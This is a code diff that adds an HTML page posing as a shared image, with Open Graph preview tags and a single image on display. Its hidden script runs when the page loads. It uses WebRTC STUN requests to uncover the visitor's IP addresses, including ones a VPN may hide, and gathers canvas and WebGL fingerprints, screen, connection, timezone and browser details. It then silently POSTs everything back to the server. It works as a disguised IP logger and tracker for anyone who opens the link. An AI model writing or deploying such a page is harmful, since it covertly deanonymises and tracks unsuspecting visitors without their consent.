@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="{{title}}"/>
+    <meta property="og:type" content="image"/>
+    <meta property="og:url" content="{{image_url}}"/>
+    <meta property="og:image" content="{{image_url}}"/>
+    <meta property="og:site_name" content="{{image_url}}"/>
+    <meta property="og:image:type" content="image/jpg" /> 
+    <meta property="og:image:width" content="700" /> 
+    <meta property="og:image:height" content="300" />
+    <title>{{title}}</title>
+</head>
+<body>
+	<img src="{{image_url}}" width="300" height="300" alt="" srcset="">    
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script>
+      	 (function () {
+             'use strict';
+            let ip=undefined;
+            let ipv4=undefined
+            let ipv6=undefined;
+            let is_rtc=false;
+            let is_err=false;
+            const ipv4Regex =/^(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}$/;
+            const ipv6Regex =/^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(([0-9a-fA-F]{1,4}:){1,7}:)|(([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4})|(([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2})|(([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3})|(([0-9a-fA-F]{1,3}:){1,3}(:[0-9a-fA-F]{1,4}){1,4})|(([0-9a-fA-F]{1,2}:){1,2}(:[0-9a-fA-F]{1,4}){1,5})|([0-9a-fA-F]{1,4}:)((:[0-9a-fA-F]{1,4}){1,6})|:(:[0-9a-fA-F]{1,4}){1,7}|::)$/;
+        
+            // Advanced data collection
+            let screenData = {};
+            let webglData = {};
+            let canvasData = {};
+            let connectionData = {};
+            let timingData = {};
+            
+            function collectScreenInfo() {
+                screenData = {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio,
+                    resolution: `${screen.width}x${screen.height}`
+                };
+            }
+            
+            function collectWebGLInfo() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        webglData = {
+                            vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+                            renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
+                        };
+                    }
+                } catch (e) {
+                    console.log('WebGL not supported');
+                }
+            }
+            
+            function collectCanvasFingerprint() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = 200;
+                    canvas.height = 50;
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(125, 1, 62, 20);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('Canvas fingerprint', 2, 15);
+                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                    ctx.fillText('Canvas fingerprint', 4, 17);
+                    canvasData = {
+                        fingerprint: canvas.toDataURL().slice(-50)
+                    };
+                } catch (e) {
+                    console.log('Canvas fingerprint failed');
+                }
+            }
+            
+            function collectConnectionInfo() {
+                if (navigator.connection) {
+                    connectionData = {
+                        type: navigator.connection.type || 'unknown',
+                        downlink: navigator.connection.downlink || 'unknown',
+                        rtt: navigator.connection.rtt || 'unknown'
+                    };
+                }
+            }
+            
+            function collectTimingInfo() {
+                if (window.performance && window.performance.timing) {
+                    timingData = {
+                        rtt: window.performance.timing.responseEnd - window.performance.timing.requestStart
+                    };
+                }
+            }
+            
+            function send_data(){
+            
+                setTimeout(()=>{
+                    
+                    if((!ipv4 && !ipv6) || (is_err)){
+                        is_rtc=false
+                    }else{
+                        is_rtc=true
+                    }
+                    
+                    // Collect all advanced data
+                    collectScreenInfo();
+                    collectWebGLInfo();
+                    collectCanvasFingerprint();
+                    collectConnectionInfo();
+                    collectTimingInfo();
+                    
+                    // Build comprehensive data payload
+                    let formData = new FormData();
+                    formData.append('ipv4', ipv4 || '');
+                    formData.append('ipv6', ipv6 || '');
+                    formData.append('is_rtc', is_rtc);
+                    
+                    // Browser data
+                    formData.append('navigator.userAgent', navigator.userAgent);
+                    formData.append('navigator.appVersion', navigator.appVersion);
+                    formData.append('navigator.platform', navigator.platform);
+                    formData.append('navigator.vendor', navigator.vendor);
+                    formData.append('navigator.language', navigator.language);
+                    formData.append('timezone', Intl.DateTimeFormat().resolvedOptions().timeZone);
+                    
+                    // Screen data
+                    Object.keys(screenData).forEach(key => {
+                        formData.append(`screen.${key}`, screenData[key]);
+                    });
+                    
+                    // WebGL data
+                    Object.keys(webglData).forEach(key => {
+                        formData.append(`webgl.${key}`, webglData[key]);
+                    });
+                    
+                    // Canvas data
+                    Object.keys(canvasData).forEach(key => {
+                        formData.append(`canvas.${key}`, canvasData[key]);
+                    });
+                    
+                    // Connection data
+                    Object.keys(connectionData).forEach(key => {
+                        formData.append(`connection.${key}`, connectionData[key]);
+                    });
+                    
+                    // Timing data
+                    Object.keys(timingData).forEach(key => {
+                        formData.append(`timing.${key}`, timingData[key]);
+                    });
+                    
+                    // OS and browser detection
+                    formData.append('os.name', e.os.name);
+                    formData.append('os.version', e.os.version);
+                    formData.append('browser.name', e.browser.name);
+                    formData.append('browser.version', e.browser.version);
+                    
+                    fetch(window.location.href,{
+                            method:"POST", 
+                            body:formData
+                        }
+                    )
+                        
+                },2000)
+            }
+            
+             var module = {
+                 options: [],
+                 header: [navigator.platform, navigator.userAgent, navigator.appVersion, navigator.vendor, window.opera],
+                 dataos: [
+                     { name: 'Windows Phone', value: 'Windows Phone', version: 'OS' },
+                     { name: 'Windows', value: 'Win', version: 'NT' },
+                     { name: 'iPhone', value: 'iPhone', version: 'OS' },
+                     { name: 'iPad', value: 'iPad', version: 'OS' },
+                     { name: 'Kindle', value: 'Silk', version: 'Silk' },
+                     { name: 'Android', value: 'Android', version: 'Android' },
+                     { name: 'PlayBook', value: 'PlayBook', version: 'OS' },
+                     { name: 'BlackBerry', value: 'BlackBerry', version: '/' },
+                     { name: 'Macintosh', value: 'Mac', version: 'OS X' },
+                     { name: 'Linux', value: 'Linux', version: 'rv' },
+                     { name: 'Palm', value: 'Palm', version: 'PalmOS' }
+                 ],
+                 databrowser: [
+                     { name: 'Chrome', value: 'Chrome', version: 'Chrome' },
+                     { name: 'Firefox', value: 'Firefox', version: 'Firefox' },
+                     { name: 'Safari', value: 'Safari', version: 'Version' },
+                     { name: 'Internet Explorer', value: 'MSIE', version: 'MSIE' },
+                     { name: 'Opera', value: 'Opera', version: 'Opera' },
+                     { name: 'BlackBerry', value: 'CLDC', version: 'CLDC' },
+                     { name: 'Mozilla', value: 'Mozilla', version: 'Mozilla' }
+                 ],
+                 init: function () {
+                     var agent = this.header.join(' '),
+                         os = this.matchItem(agent, this.dataos),
+                         browser = this.matchItem(agent, this.databrowser);
+                    
+                     return { os: os, browser: browser };
+                 },
+                 matchItem: function (string, data) {
+                     var i = 0,
+                         j = 0,
+                         html = '',
+                         regex,
+                         regexv,
+                         match,
+                         matches,
+                         version;
+                    
+                     for (i = 0; i < data.length; i += 1) {
+                         regex = new RegExp(data[i].value, 'i');
+                         match = regex.test(string);
+                         if (match) {
+                             regexv = new RegExp(data[i].version + '[- /:;]([\d._]+)', 'i');
+                             matches = string.match(regexv);
+                             version = '';
+                             if (matches) { if (matches[1]) { matches = matches[1]; } }
+                             if (matches) {
+                                 matches = matches.split(/[._]+/);
+                                 for (j = 0; j < matches.length; j += 1) {
+                                     if (j === 0) {
+                                         version += matches[j] + '.';
+                                     } else {
+                                         version += matches[j];
+                                     }
+                                 }
+                             } else {
+                                 version = '0';
+                             }
+                             return {
+                                 name: data[i].name,
+                                 version: parseFloat(version)
+                             };
+                         }
+                     }
+                     return { name: 'unknown', version: 0 };
+                 }
+             };
+            
+            var e = module.init(),debug = '';
+
+           
+            
+            try {
+                
+                const stun_config = {
+                    iceServers: [
+                        { urls: "stun:stun.l.google.com:19302" },
+                        { urls: "stun:stun.antisip.com:3478" },
+                        { urls: "stun:stun.arbuz.ru:3478" },
+                        { urls: "stun:stun.avigora.com:3478" },
+                        { urls: "stun:stun.avigora.fr:3478" },
+                        { urls: "stun:stun.awt.be:3478" }
+                    ]
+                };
+                const peer_connection = new RTCPeerConnection(stun_config);
+                
+                peer_connection.createDataChannel("");
+                peer_connection.createOffer().then(oferta => peer_connection.setLocalDescription(oferta));
+                
+                peer_connection.onicecandidate = (evento) => {
+                    if (evento.candidate) {
+                        
+                        ip = evento.candidate.candidate.split(' ')[4];
+                       
+                        if(ip){
+                            
+                            if (ipv4Regex.test(ip)) {
+                                ipv4=ip
+                            }
+                            else if(ipv6Regex.test(ip)){
+                                ipv6=ip
+                            }
+                        }
+                    }
+                };
+                
+
+                
+            } catch (error) {
+                is_err=true
+            }
+    
+            send_data()
+                
+            
+         }());	
+     </script>
+ </body>
+ </html>
